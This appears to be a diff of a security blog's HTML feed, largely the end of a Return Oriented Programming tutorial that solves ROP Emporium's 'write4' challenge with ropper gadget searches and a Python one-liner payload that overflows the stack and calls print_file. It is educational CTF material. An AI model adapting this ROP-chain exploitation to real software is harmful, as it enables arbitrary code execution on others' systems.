+0x0000000000400606: mov dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp + 0x48], edx&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; mov ebp, esp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; call 0x500&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; mov eax, 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop rbp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+0x0000000000400629: mov dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsi], edi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+0x0000000000400628: mov qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;r14], r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword ptr [r14], r15; ret&lt;/code&gt; at line &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400628&lt;/code&gt; seems perfect for us! Now, we just need to find a way to modify the registers so that &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x666c61672e747874&lt;/code&gt;. We could do this by searching for a &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14&lt;/code&gt; instruction and a &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r15&lt;/code&gt; instruction.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; write4 &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pop r14%; ret&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Load gadgets from cache
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] loading... 100%
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] removing double gadgets... 100%
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;gadgets: pop r14%&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File: write4
+0x0000000000400690: pop r14&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luckily for us, in this scenario the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r15&lt;/code&gt; instructions were right next to each other. This means that we can put both of their values on the stack without needing another ROP gadget (recall that since our input buffer is on the stack, we can add more and more addresses on the stack).&lt;/p&gt;
+
+&lt;p&gt;So far, our stack buffer overflow should look like this:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;“A” written 40 times.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400690&lt;/code&gt;, which will make the program jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14; pop r15; ret&lt;/code&gt; instructions.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; to the memory location where we are writing our string.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x666c61672e747874&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; to “flag.txt” written in ASCII.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400628&lt;/code&gt;, which will jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword ptr [r14], r15; ret;&lt;/code&gt; instruction after we have set &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This gives us the following input (which won’t work yet).&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b'A'*40 + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x06\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x28\x10\x60\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x6c\x61\x67\x2e\x74\x78\x74&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x28\x06\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;')&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;./&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write4&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In case you still don’t understand why this works, here is what is actually going on:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Because of the buffer overflow, RIP is overwritten with &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400690&lt;/code&gt;, which is the location of the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14; pop r15; ret&lt;/code&gt; ROP gadget.&lt;/li&gt;
+  &lt;li&gt;When &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14&lt;/code&gt; is executed, we will get &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;When &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r15&lt;/code&gt; is executed, we will get &lt;code class=&quot;highlighter-rouge&quot;&gt;0x666c61672e747874&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;After that, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400628&lt;/code&gt; is on the stack, which means that the &lt;code class=&quot;highlighter-rouge&quot;&gt;RET&lt;/code&gt; instruction will jump to that location.&lt;/li&gt;
+  &lt;li&gt;The next ROP gadget that we execute contains &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword ptr [r14], r15;&lt;/code&gt;, which moves our copies our string into the location that &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; points to.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;We still need to do the following for the exploit to work:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Set &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt; (recall that the first parameter to a function is in &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; for x86-64 binaries)&lt;/li&gt;
+  &lt;li&gt;Jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file()&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;calling-the-function&quot;&gt;Calling the Function&lt;/h3&gt;
+
+&lt;p&gt;Using ropper, we can find a way for us to modify &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; the same way we modified &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; write4 &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pop rdi; ret&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Load gadgets from cache
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] loading... 100%
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] removing double gadgets... 100%
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;gadgets: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File: write4
+0x0000000000400693: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we jump to this ROP gadget and add &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt; onto the stack, then when the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; instruction is executed, we will have &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; point to the location of our string. From there, we can add &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400510&lt;/code&gt; to the stack, which is the location of the PLT entry for &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(char *filename)&lt;/code&gt;. When the &lt;code class=&quot;highlighter-rouge&quot;&gt;RET&lt;/code&gt; instruction is executed, we will call &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(&quot;flag.txt&quot;)&lt;/code&gt;, which will solve the problem!&lt;/p&gt;
+
+&lt;p&gt;Our stack should now look like the following:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;“A” written 40 times.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400690&lt;/code&gt;, which will make the program jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14; pop r15; ret&lt;/code&gt; instructions.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; to the memory location where we are writing our string.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x666c61672e747874&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; to “flag.txt” written in ASCII.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400628&lt;/code&gt;, which will jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword ptr [r14], r15; ret;&lt;/code&gt; instruction after we have set &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400693&lt;/code&gt;, which will jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt; instruction.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to the memory location where we wrote our string.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400510&lt;/code&gt;, which will execute &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(&quot;flag.txt&quot;)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This gives us the following:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b'A'*40 + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;93&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00')&quot;&lt;/span&gt; | ./write4 
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Thank you!
+ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will successfully execute our ROP chain and print out our flag!&lt;/p&gt;
+
+&lt;section class=&quot;related&quot;&gt;
+  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
+  &lt;ul class=&quot;post-list&quot;&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
+          Creating a Barebones Windows Debugger
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
+          Creating a Barebones Linux Debugger
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+  &lt;/ul&gt;
+&lt;/section&gt;</content><author><name></name></author><summary type="html">In this blog post, I will be explaining how you can make use of Return Oriented Programming (ROP) gadgets in order to obtain execute code when NX is enabled. I will also be solving one of ROP Emporium’s challenges by using a ROP chain.</summary></entry><entry><title type="html">Pentesting GreenOptic: 1</title><link href="http://localhost:4000/2020/07/21/pentesting-greenoptic-1.html" rel="alternate" type="text/html" title="Pentesting GreenOptic: 1" /><published>2020-07-21T00:00:00-04:00</published><updated>2020-07-21T00:00:00-04:00</updated><id>http://localhost:4000/2020/07/21/pentesting-greenoptic-1</id><content type="html" xml:base="http://localhost:4000/2020/07/21/pentesting-greenoptic-1.html">&lt;p&gt;Today, I will be writing up how I solved the &lt;a href=&quot;https://www.vulnhub.com/entry/greenoptic-1,510/#&quot;&gt;GreenOptic: 1&lt;/a&gt; challenge from VulnHub. This was quite a difficult box to do as it led me down a bunch of rabbit-holes, but nonetheless, I was able to solve it. The challenge was designed to be realistic, and all of the things that I came across were things that could be found in a real environment.&lt;/p&gt;
 
 &lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image18.png&quot; /&gt;&lt;/p&gt;
 
@@ -144,6 +494,12 @@
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
         &lt;/a&gt;
@@ -152,12 +508,6 @@
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
           Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -518,6 +868,12 @@ void ReadMemory(char *addr_hex, int n) {
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
         &lt;/a&gt;
@@ -526,12 +882,6 @@ void ReadMemory(char *addr_hex, int n) {
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
           Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -726,6 +1076,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
         &lt;/a&gt;
@@ -734,12 +1090,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -785,6 +1135,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
         &lt;/a&gt;
@@ -793,12 +1149,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -828,6 +1178,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
           Pentesting GreenOptic: 1
         &lt;/a&gt;
@@ -836,12 +1192,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -895,6 +1245,12 @@ c7(): rax = 0x22
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
